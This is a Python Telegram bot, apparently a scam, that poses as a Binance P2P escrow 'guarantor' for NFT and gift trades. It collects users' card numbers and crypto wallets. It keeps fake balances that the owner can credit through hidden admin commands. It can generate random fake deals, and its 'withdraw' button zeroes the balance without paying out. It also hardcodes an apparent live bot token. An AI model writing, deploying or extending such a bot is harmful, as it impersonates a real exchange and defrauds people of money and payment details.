import asyncio
import logging
import os
import sys
import signal
import random
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# Настройки
BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
PORT = int(os.getenv("PORT", 8080))

# Премиум-эмодзи: ID + fallback-символ
EMOJI = {
    "ton": ("5891243564309942507", "💎"),
    "card": ("5274195706066781810", "💳"),
    "user": ("5208940588606445660", "👤"),
    "stars": ("5208730126619005798", "⭐"),
    "usdt": ("5983399041197675256", "💵"),
    "btc": ("5902056028513505203", "₿"),
    "ruble": ("5793901252987330401", "₽"),
    "people": ("5794031944547178894", "👥"),
    "money": ("5794303034292968945", "💰"),
    "briefcase": ("5794182096603847292", "💼"),
    "coin": ("5895266423952904371", "🪙"),
    "package": ("5893450623449305489", "📦"),
    "lamp": ("6039641775377748623", "💡"),
    "balance_icon": ("6039802097916974085", "💰"),
}

SHIELD_ID = "5902016123972358349"
SHIELD_FALLBACK = "🛡"

users = {}
deals = {}
deal_counter = 1000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

def is_premium_user(uid):
    return users.get(uid, {}).get("is_premium", False)

def emoji(name, uid=None):
    """Возвращает HTML-тег премиум-эмодзи или обычный символ в зависимости от Premium у пользователя."""
    e = EMOJI.get(name, ("", "❓"))
    if uid and is_premium_user(uid):
        return f"<tg-emoji emoji-id='{e[0]}'>{e[1]}</tg-emoji>"
    return e[1]

# Тексты, которые зависят от пользователя, теперь требуют uid
def welcome_text(uid):
    return (
        f"{emoji('briefcase', uid)} Добро пожаловать в Binance 🤝\n\n"
        "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
        "1⃣ Автоматические сделки с NFT и подарками\n"
        f"2⃣ {SHIELD_EMOJI(uid)} Полная защита обеих сторон\n"
        f"3⃣ {emoji('coin', uid)} Реферальная программа — 50% от комиссии\n"
        f"4⃣ {emoji('package', uid)} Передача товаров через менеджера</blockquote>\n\n"
        f"{emoji('lamp', uid)} Наш канал ─ @binance_announcements"
    )

def SHIELD_EMOJI(uid):
    return f"<tg-emoji emoji-id='{SHIELD_ID}'>{SHIELD_FALLBACK}</tg-emoji>" if is_premium_user(uid) else SHIELD_FALLBACK

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()

def get_lang(uid):
    return users.get(uid, {}).get("lang", "ru")

# Клавиатуры теперь принимают uid для динамических эмодзи
def main_menu(lang="ru", uid=None):
    t = {
        "ru": [f"{emoji('balance_icon', uid)} Баланс", "📋 Мои сделки", "🤝 Создать сделку",
               "📄 Реквизиты", f"{emoji('people', uid)} Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
        "en": [f"{emoji('balance_icon', uid)} Balance", "📋 My Deals", "🤝 New Deal",
               "📄 My Details", f"{emoji('people', uid)} Referrals", "🌐 Language / Язык", "🆘 Support"]
    }[lang]
    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
         InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
        [InlineKeyboardButton(text=t[2], callback_data=callbacks[2]),
         InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
        [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
         InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
        [InlineKeyboardButton(text=t[6], url="https://t.me/legmk")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu(uid=None):
    kb = [
        [InlineKeyboardButton(text=f"{emoji('money', uid)} Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru", uid=None):
    t = {"ru": ["📜 История", "💸 Вывод", "🔙 Назад"],
         "en": ["📜 History", "💸 Withdraw", "🔙 Back"]}[lang]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data="tx_history")],
        [InlineKeyboardButton(text=t[1], callback_data="withdraw_funds")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru", uid=None):
    items = ["ton","card","username","stars","usdt","btc"]
    labels_ru = [f"{emoji('ton', uid)} TON", f"{emoji('card', uid)} Карта", f"{emoji('user', uid)} Юзернейм",
                 f"{emoji('stars', uid)} Звезды", f"{emoji('usdt', uid)} USDT", f"{emoji('btc', uid)} BTC"]
    labels_en = [f"{emoji('ton', uid)} TON", f"{emoji('card', uid)} Card", f"{emoji('user', uid)} Username",
                 f"{emoji('stars', uid)} Stars", f"{emoji('usdt', uid)} USDT", f"{emoji('btc', uid)} BTC"]
    labels = labels_ru if lang=="ru" else labels_en
    kb = []
    for i in range(6):
        kb.append([InlineKeyboardButton(text=labels[i], callback_data=f"set_{items[i]}")])
    kb.append([InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru", uid=None):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller")],
        [InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru", uid=None):
    cur = [(f"{emoji('ton', uid)} TON", "ton"), (f"{emoji('card', uid)} Карта", "card"),
           (f"{emoji('user', uid)} Юзернейм", "username"), (f"{emoji('stars', uid)} Звезды", "stars"),
           (f"{emoji('usdt', uid)} USDT", "usdt"), (f"{emoji('btc', uid)} BTC", "btc")]
    kb = []
    for c in cur:
        kb.append([InlineKeyboardButton(text=c[0], callback_data=f"cur_{c[1]}")])
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
    ])

# Утилиты отправки
async def _delete_message(chat_id, msg_id):
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def delete_and_send_banner(call: CallbackQuery, caption: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=reply_markup,
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

async def delete_and_send_text(call: CallbackQuery, text: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = await call.message.answer(text, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(call.from_user.id, {})["last_menu_msg_id"] = new_msg.message_id

async def return_to_main(call: CallbackQuery, lang: str):
    uid = call.from_user.id
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    caption = welcome_text(uid)
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(lang, uid),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=main_menu(lang, uid), parse_mode="HTML")
    users.setdefault(uid, {})["last_menu_msg_id"] = new_msg.message_id

def username_or_id(uid):
    if uid is None: return "—"
    u = users.get(uid, {})
    if "username" in u and u["username"]: return f"@{u['username']}"
    return str(uid)

def deal_status_text(deal):
    if deal["status"] == "completed": return "Завершена"
    if deal["status"] == "active":
        if deal["seller_id"] is None: return "Ожидание продавца"
        if deal["buyer_id"] is None: return "Ожидание покупателя"
        return "Проворачивание сделки"
    return deal["status"]

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    seller_id = d["seller_id"]
    buyer_id = d["buyer_id"]
    amt = d["amount"]

    if seller_id is None or buyer_id is None:
        txt = "❌ Нельзя завершить сделку: отсутствует продавец или покупатель."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    buyer_balance = users.get(buyer_id, {}).get("balance", 0)
    if buyer_balance < amt:
        txt = f"❌ У покупателя (ID {buyer_id}) недостаточно средств. Баланс: {buyer_balance} {emoji('ruble', buyer_id)}, требуется: {amt} {emoji('ruble', buyer_id)}."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    users[buyer_id]["balance"] -= amt
    users[buyer_id].setdefault("history", []).append(f"💸 Сделка #{deal_id}: -{amt} {emoji('ruble', buyer_id)}")

    if seller_id not in users:
        users[seller_id] = {"balance": 0, "history": [], "completed_deals": 0}
    users[seller_id]["balance"] += amt
    users[seller_id].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt} {emoji('ruble', seller_id)}")
    users[seller_id]["completed_deals"] = users[seller_id].get("completed_deals", 0) + 1

    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt} {emoji('ruble', seller_id)}."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu(seller_id if call else None))
    try:
        await bot.send_message(seller_id, f"✅ Сделка #{deal_id} завершена! +{amt} {emoji('ruble', seller_id)}.")
        await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble', buyer_id)}.")
    except: pass

# Обновление статуса Premium при любом взаимодействии
def update_premium(user: types.User):
    uid = user.id
    if uid not in users:
        users[uid] = {}
    users[uid]["is_premium"] = getattr(user, "is_premium", False)

# /start
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = message.from_user.id
    update_premium(message.from_user)
    args = message.text.split()
    ref_id = None

    if len(args) > 1 and args[1].startswith("deal_"):
        try:
            deal_id = int(args[1].split("_")[1])
            if deal_id in deals and deals[deal_id]["status"] == "active":
                d = deals[deal_id]
                if d["seller_id"] is None and d["buyer_id"] != uid:
                    d["seller_id"] = uid
                elif d["buyer_id"] is None and d["seller_id"] != uid:
                    d["buyer_id"] = uid
                else:
                    return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
                if d["seller_id"] is not None and d["buyer_id"] is not None:
                    d["status"] = "active"
                other_id = d["seller_id"] if d["seller_id"] != uid else d["buyer_id"]
                if other_id:
                    try:
                        await bot.send_message(other_id,
                            f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
                            f"Продавец: {username_or_id(d['seller_id'])}\n"
                            f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                            f"Статус: {deal_status_text(d)}\n"
                            f"Сумма: {d['amount']} {d['currency']}"
                        )
                    except: pass
                return await message.answer(
                    f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
                    f"Продавец: {username_or_id(d['seller_id'])}\n"
                    f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                    f"Статус: {deal_status_text(d)}\n"
                    f"Сумма: {d['amount']} {d['currency']}",
                    reply_markup=main_menu(get_lang(uid), uid)
                )
        except: pass

    if len(args) > 1:
        try: ref_id = int(args[1])
        except: pass

    if uid not in users:
        users[uid] = {
            "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": ref_id, "referrals": [],
            "last_menu_msg_id": None, "completed_deals": 0, "ref_earned_ton": 0.0, "is_premium": False
        }
    else:
        users[uid].update({
            "balance": users[uid].get("balance", 0.0),
            "ton": users[uid].get("ton", ""),
            "card": users[uid].get("card", ""),
            "username": users[uid].get("username", ""),
            "stars": users[uid].get("stars", ""),
            "usdt": users[uid].get("usdt", ""),
            "btc": users[uid].get("btc", ""),
            "lang": users[uid].get("lang", "ru"),
            "history": users[uid].get("history", []),
            "pending_rekv": users[uid].get("pending_rekv"),
            "referrer_id": ref_id,
            "referrals": users[uid].get("referrals", []),
            "last_menu_msg_id": users[uid].get("last_menu_msg_id"),
            "completed_deals": users[uid].get("completed_deals", 0),
            "ref_earned_ton": users[uid].get("ref_earned_ton", 0.0),
            "is_premium": users[uid].get("is_premium", False)
        })

    if ref_id and ref_id != uid and ref_id in users:
        users[ref_id]["balance"] += 2.0
        users[ref_id].setdefault("history", []).append(f"🎁 Реферал: +2 {emoji('ruble', ref_id)} от {uid}")
        users[ref_id].setdefault("referrals", []).append(uid)
        try: await bot.send_message(ref_id, f"🎁 +2 {emoji('ruble', ref_id)} за друга!")
        except: pass

    last_msg_id = users[uid].get("last_menu_msg_id")
    if last_msg_id:
        await _delete_message(message.chat.id, last_msg_id)

    caption = welcome_text(uid)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(get_lang(uid), uid),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await message.answer(caption, reply_markup=main_menu(get_lang(uid), uid), parse_mode="HTML")

    users[uid]["last_menu_msg_id"] = new_msg.message_id

# Админ-команды
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu(message.from_user.id))

@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Зачисление: +{amt} {emoji('ruble', uid)}")
        await message.answer(f"✅ Пользователю {uid} выдано {amt} {emoji('ruble', uid)}.")
        try: await bot.send_message(uid, f"💰 На ваш баланс зачислено {amt} {emoji('ruble', uid)}.")
        except: pass
    except: await message.answer("❌ Формат: /masterb user_id сумма")

@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active":
            return await message.answer("❌ Сделка не найдена или неактивна.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Формат: /giveMas deal_id")

# Главное меню
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call: CallbackQuery):
    update_premium(call.from_user)
    await return_to_main(call, get_lang(call.from_user.id))

# Админ колбэки
@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID пользователя и сумму через пробел:\nПример: 123456789 500", back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Админ: +{amt} {emoji('ruble', uid)}")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt} {emoji('ruble', uid)}.", reply_markup=admin_menu(uid))
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID сделки для завершения:", back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    update_premium(message.from_user)
    if message.from_user.id != MASTER_ID: return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active":
            return await message.answer("❌ Сделка не найдена или неактивна.", reply_markup=admin_menu(message.from_user.id))
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введите корректный ID сделки.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    if not deals: return await delete_and_send_text(call, "📭 Сделок нет.", admin_menu(call.from_user.id))
    txt = "📋 Все сделки:\n\n" + "\n".join(
        [f"#{did}: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
    )
    await delete_and_send_text(call, txt, admin_menu(call.from_user.id))

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    total_users = len(users)
    total_deals = len(deals)
    active_deals = sum(1 for d in deals.values() if d["status"] == "active")
    total_balance = sum(u.get("balance", 0) for u in users.values())
    txt = f"📊 Статистика:\n\n👥 Пользователей: {total_users}\n📋 Сделок: {total_deals}\n🟢 Активных: {active_deals}\n💰 Общий баланс: {total_balance} {emoji('ruble', call.from_user.id)}"
    await delete_and_send_text(call, txt, admin_menu(call.from_user.id))

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call: CallbackQuery):
    update_premium(call.from_user)
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        deals[deal_counter] = {
            "seller_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "amount": round(random.uniform(100, 10000), 2),
            "currency": random.choice(cur_list),
            "status": "active"
        }
    await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu(call.from_user.id))

# Баланс
@dp.callback_query(F.data == "balance_menu")
async def balance_menu_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    bal = users.get(uid, {}).get("balance", 0)
    completed = users.get(uid, {}).get("completed_deals", 0)
    if bal == 0:
        balance_line = "💔 Ваш баланс пока пуст"
    else:
        balance_line = f"{emoji('balance_icon', uid)} Ваш баланс: {bal:.2f} {emoji('ruble', uid)}"
    txt = (
        f"{emoji('balance_icon', uid)} Ваш баланс:\n\n"
        f"{balance_line}\n\n"
        f"📈 Завершённых сделок: {completed}"
    )
    await delete_and_send_banner(call, txt, balance_menu(lang, uid))

@dp.callback_query(F.data == "tx_history")
async def tx_history_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    h = users.get(uid, {}).get("history", [])
    txt = "📜 История транзакций:\n" + ("\n".join(h[-15:]) if h else "Пусто")
    await delete_and_send_text(call, txt, back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def withdraw_funds_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    b = users.get(uid, {}).get("balance", 0)
    if b <= 0:
        await call.answer("❌ Недостаточно средств" if lang=="ru" else "❌ Insufficient funds", show_alert=True)
        return
    users[uid]["balance"] = 0.0
    users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble', uid)}")
    await delete_and_send_text(call, f"✅ Заявка на вывод {b:.2f} {emoji('ruble', uid)} принята.", back_button(lang))

# Реквизиты
@dp.callback_query(F.data == "my_rekv")
async def rekv_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    u = users.get(uid, {})
    lbl = {"ton":f"{emoji('ton', uid)} TON","card":f"{emoji('card', uid)} Карта","username":f"{emoji('user', uid)} Юзернейм",
           "stars":f"{emoji('stars', uid)} Звезды","usdt":f"{emoji('usdt', uid)} USDT","btc":f"{emoji('btc', uid)} BTC"}
    entries = [f"{v}: {u.get(k, '❌ не указан')}" for k,v in lbl.items()]
    txt = "📄 Ваши реквизиты для получения средств:\n\n" + "\n".join(entries)
    await delete_and_send_text(call, txt, rekv_menu(lang, uid))

for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"),
                ("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask_rekv(call: CallbackQuery, key=key):
        update_premium(call.from_user)
        uid = call.from_user.id; lang = get_lang(uid)
        prompts = {
            "ton": (f"Введите {emoji('ton', uid)} TON кошелёк:", f"Enter {emoji('ton', uid)} TON wallet:"),
            "card": (f"Введите {emoji('card', uid)} номер карты:", f"Enter {emoji('card', uid)} card number:"),
            "username": (f"Введите {emoji('user', uid)} юзернейм:", f"Enter {emoji('user', uid)} username:"),
            "stars": (f"Введите {emoji('stars', uid)} ID звёзд:", f"Enter {emoji('stars', uid)} Stars ID:"),
            "usdt": (f"Введите {emoji('usdt', uid)} USDT кошелёк:", f"Enter {emoji('usdt', uid)} USDT wallet:"),
            "btc": (f"Введите {emoji('btc', uid)} BTC кошелёк:", f"Enter {emoji('btc', uid)} BTC wallet:")
        }
        users[uid]["pending_rekv"] = key
        await delete_and_send_text(call, prompts[key][0] if lang=="ru" else prompts[key][1], back_button(lang))

# Сделки
@dp.callback_query(F.data == "new_deal")
async def new_deal_handler(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    await state.clear()
    lang = get_lang(call.from_user.id)
    txt = (
        "🤝 Создание P2P сделки\n\n"
        "Выберите свою роль в сделке:\n"
        "• Продавец — вы получите оплату после подтверждения менеджером.\n"
        "• Покупатель — вы получите товар после оплаты."
    ) if lang=="ru" else (
        "🤝 New P2P deal\n\n"
        "Choose your role:\n"
        "• Seller — you'll receive payment after manager confirmation.\n"
        "• Buyer — you'll receive the item after payment."
    )
    await delete_and_send_banner(call, txt, deal_role_choice(lang, call.from_user.id))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_chosen(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    lang = get_lang(call.from_user.id)
    await delete_and_send_banner(call, "Выберите валюту, которой продавец получит деньги:", currency_choice(lang, call.from_user.id))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def currency_chosen(call: CallbackQuery, state: FSMContext):
    update_premium(call.from_user)
    cur = call.data.replace("cur_", "")
    await state.update_data(currency=cur)
    lang = get_lang(call.from_user.id)
    await delete_and_send_banner(call, f"💰 Введите сумму сделки (в {emoji('ruble', call.from_user.id)}):", back_button(lang))
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def amount_entered(message: Message, state: FSMContext):
    update_premium(message.from_user)
    global deal_counter
    uid = message.from_user.id
    lang = get_lang(uid)
    try:
        amt = float(message.text)
        if amt <= 0: raise ValueError
    except:
        return await message.answer("❌ Введите корректное положительное число.")
    data = await state.get_data()
    role = data["role"]
    currency = data["currency"]

    deal_counter += 1
    seller_id = uid if role == "seller" else None
    buyer_id = uid if role == "buyer" else None

    deals[deal_counter] = {
        "seller_id": seller_id,
        "buyer_id": buyer_id,
        "amount": amt,
        "currency": currency,
        "status": "active"
    }

    link = f"https://t.me/{(await bot.me()).username}?start=deal_{deal_counter}"

    text = (
        f"✅ Сделка #{deal_counter} создана!\n\n"
        f"👤 Продавец: {username_or_id(seller_id)}\n"
        f"👤 Покупатель: {username_or_id(buyer_id)}\n"
        f"📌 Статус: {deal_status_text(deals[deal_counter])}\n"
        f"💰 Сумма: {amt} {emoji('ruble', uid)} ({currency})\n\n"
        f"🔗 Отправьте эту ссылку второй стороне для присоединения:\n{link}\n\n"
        f"После входа обеих сторон менеджер завершит сделку."
    )
    await message.answer(text, reply_markup=main_menu(lang, uid))
    await state.clear()

# Мои сделки
@dp.callback_query(F.data == "my_deals")
async def my_deals_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    user_deals = [(did, d) for did, d in deals.items() if d["seller_id"] == uid or d["buyer_id"] == uid]
    if not user_deals:
        await delete_and_send_text(call, "🔍 У вас пока нет активных сделок.", back_button(lang))
        return
    txt = "📋 Ваши сделки:\n\n" + "\n".join(
        [f"🔹 #{did}: {d['amount']} {emoji('ruble', uid)} ({d['currency']}) | Статус: {deal_status_text(d)}" for did, d in user_deals]
    )
    txt += "\n\n🔎 Быстрый поиск: /search код_сделки"
    await delete_and_send_text(call, txt, back_button(lang))

@dp.message(Command("search"))
async def search_cmd(message: Message):
    update_premium(message.from_user)
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        d = deals.get(did)
        if d:
            await message.answer(
                f"🔍 Сделка #{did}:\n"
                f"Продавец: {username_or_id(d['seller_id'])}\n"
                f"Покупатель: {username_or_id(d['buyer_id'])}\n"
                f"Сумма: {d['amount']} {emoji('ruble', message.from_user.id)} ({d['currency']})\n"
                f"Статус: {deal_status_text(d)}"
            )
        else:
            await message.answer("❌ Сделка не найдена.")
    except:
        await message.answer("❌ Формат: /search код_сделки")

# Рефералы
@dp.callback_query(F.data == "referrals")
async def referrals_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    refs = users.get(uid, {}).get("referrals", [])
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"
    earned_ton = users.get(uid, {}).get("ref_earned_ton", 0.0)
    txt = (
        f"{emoji('people', uid)} Реферальная программа\n\n"
        f"<blockquote>🔗 Ваша ссылка:\n{link}\n\n"
        f"{emoji('people', uid)} Рефералов: {len(refs)}\n"
        f"{emoji('balance_icon', uid)} Заработано: {earned_ton} TON</blockquote>\n\n"
        f"{emoji('coin', uid)} Бонус: 50% от комиссии с каждой сделки реферала!"
    ) if lang=="ru" else (
        f"{emoji('people', uid)} Referral Program\n\n"
        f"<blockquote>🔗 Your link:\n{link}\n\n"
        f"{emoji('people', uid)} Referrals: {len(refs)}\n"
        f"{emoji('balance_icon', uid)} Earned: {earned_ton} TON</blockquote>\n\n"
        f"{emoji('coin', uid)} Bonus: 50% commission from each referral deal!"
    )
    await delete_and_send_banner(call, txt, back_button(lang))

# Смена языка
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id
    cur_lang = users.setdefault(uid, {}).setdefault("lang", "ru")
    new_lang = "en" if cur_lang == "ru" else "ru"
    users[uid]["lang"] = new_lang
    await return_to_main(call, new_lang)

# Ввод реквизитов (общий)
@dp.message()
async def handle_rekv_input(message: Message):
    update_premium(message.from_user)
    uid = message.from_user.id
    if uid in users and users[uid].get("pending_rekv"):
        key = users[uid]["pending_rekv"]
        users[uid][key] = message.text
        users[uid]["pending_rekv"] = None
        lang = get_lang(uid)
        await message.answer("✅ Сохранено!", reply_markup=main_menu(lang, uid))

# HTTP-сервер
async def handle_health(request):
    return web.Response(text="OK", status=200)

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logging.info(f"HTTP server started on port {PORT}")

async def main():
    logging.info("Запуск бота и HTTP-сервера...")
    try: await bot.session.close()
    except: pass
    await bot.delete_webhook(drop_pending_updates=True)
    await run_web_server()
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), polling_timeout=20, handle_as_tasks=True)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))
    asyncio.run(main())
